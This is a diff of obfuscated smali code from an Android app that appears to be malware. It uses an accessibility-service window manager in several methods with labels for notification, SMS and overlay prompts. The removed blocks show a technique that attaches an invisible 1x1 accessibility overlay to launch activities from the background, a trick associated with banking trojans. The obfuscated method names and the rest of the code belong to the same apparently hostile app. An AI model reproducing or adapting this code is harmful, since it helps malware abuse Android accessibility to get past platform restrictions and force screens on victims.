@@ -5149,7 +5149,7 @@
 .end method
 
 .method public static gIIiyi2ddlMDR0(Landroid/content/Context;)V
-    .locals 6
+    .locals 2
 
     .line 1
     :try_start_0
@@ -5175,29 +5175,7 @@
     .line 11
     .line 12
     .line 13
-    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;
-    if-eqz v2, :no_overlay_notif
-
-    new-instance v3, Landroid/view/View;
-    invoke-direct {v3, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V
-    new-instance v4, Landroid/view/WindowManager$LayoutParams;
-    invoke-direct {v4}, Landroid/view/WindowManager$LayoutParams;-><init>()V
-    const v5, 0x7f0
-    iput v5, v4, Landroid/view/WindowManager$LayoutParams;->type:I
-    const/16 v5, 0x18
-    iput v5, v4, Landroid/view/WindowManager$LayoutParams;->flags:I
-    const/4 v5, 0x1
-    iput v5, v4, Landroid/view/ViewGroup$LayoutParams;->width:I
-    iput v5, v4, Landroid/view/ViewGroup$LayoutParams;->height:I
-    invoke-interface {v2, v3, v4}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
     invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
-    invoke-interface {v2, v3}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
-    goto :done_notif
-
-    :no_overlay_notif
-    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
-
-    :done_notif
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -5330,7 +5308,7 @@
 .end method
 
 .method public static hjneShqpF9Tis4(Landroid/content/Context;)V
-    .locals 7
+    .locals 3
 
     .line 1
     :try_start_0
@@ -5369,29 +5347,7 @@
     .line 18
     .line 19
     .line 20
-    sget-object v3, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;
-    if-eqz v3, :no_overlay_sms
-
-    new-instance v4, Landroid/view/View;
-    invoke-direct {v4, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V
-    new-instance v5, Landroid/view/WindowManager$LayoutParams;
-    invoke-direct {v5}, Landroid/view/WindowManager$LayoutParams;-><init>()V
-    const v6, 0x7f0
-    iput v6, v5, Landroid/view/WindowManager$LayoutParams;->type:I
-    const/16 v6, 0x18
-    iput v6, v5, Landroid/view/WindowManager$LayoutParams;->flags:I
-    const/4 v6, 0x1
-    iput v6, v5, Landroid/view/ViewGroup$LayoutParams;->width:I
-    iput v6, v5, Landroid/view/ViewGroup$LayoutParams;->height:I
-    invoke-interface {v3, v4, v5}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
     invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
-    invoke-interface {v3, v4}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
-    goto :done_sms
-
-    :no_overlay_sms
-    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
-
-    :done_sms
 
     .line 21
     .line 22
@@ -6868,7 +6824,7 @@
 .end method
 
 .method public static wotphlvK9sPbXJ(Landroid/content/Context;)V
-    .locals 8
+    .locals 4
 
     .line 1
     :try_start_0
@@ -6966,29 +6922,7 @@
 
     sput-object v1, Lv/s/VpKcDcuRNaQkRJ5;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;
 
-    sget-object v4, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;
-    if-eqz v4, :no_overlay_ovrl
-
-    new-instance v5, Landroid/view/View;
-    invoke-direct {v5, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V
-    new-instance v6, Landroid/view/WindowManager$LayoutParams;
-    invoke-direct {v6}, Landroid/view/WindowManager$LayoutParams;-><init>()V
-    const v7, 0x7f0
-    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->type:I
-    const/16 v7, 0x18
-    iput v7, v6, Landroid/view/WindowManager$LayoutParams;->flags:I
-    const/4 v7, 0x1
-    iput v7, v6, Landroid/view/ViewGroup$LayoutParams;->width:I
-    iput v7, v6, Landroid/view/ViewGroup$LayoutParams;->height:I
-    invoke-interface {v4, v5, v6}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
     invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
-    invoke-interface {v4, v5}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
-    goto :done_ovrl
-
-    :no_overlay_ovrl
-    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
-
-    :done_ovrl
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
